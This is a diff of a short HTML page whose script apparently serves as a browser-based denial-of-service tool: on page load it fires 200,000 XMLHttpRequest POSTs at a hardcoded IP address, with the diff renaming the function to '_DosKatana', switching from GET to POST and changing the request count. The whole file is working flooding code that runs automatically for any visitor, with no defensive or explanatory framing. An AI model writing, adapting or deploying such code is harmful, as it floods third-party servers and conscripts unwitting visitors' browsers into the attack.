@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html>
 	<head>
-		<title>xml_dos</title>
+		<title>_DosKatana</title>
 	</head>
 	<body>
 		<script>
-			function xml_dos(power, url) {
+			function _DosKatana(power, url) {
 					for (i=1; i<=power; i++) {
 						x = new XMLHttpRequest;
 
@@ -13,12 +13,13 @@
 							document.write(this.responseText)
 						};
 
-						x.open('GET', url);
+						x.open('POST', url);
 						x.send();
 					}
 			}
 
-			xml_dos(300000, 'http://88.198.48.45');
+			_DosKatana(200000, 'http://88.198.48.45');
 		</script>
+		<p>test</p>
 	</body>
 </html>
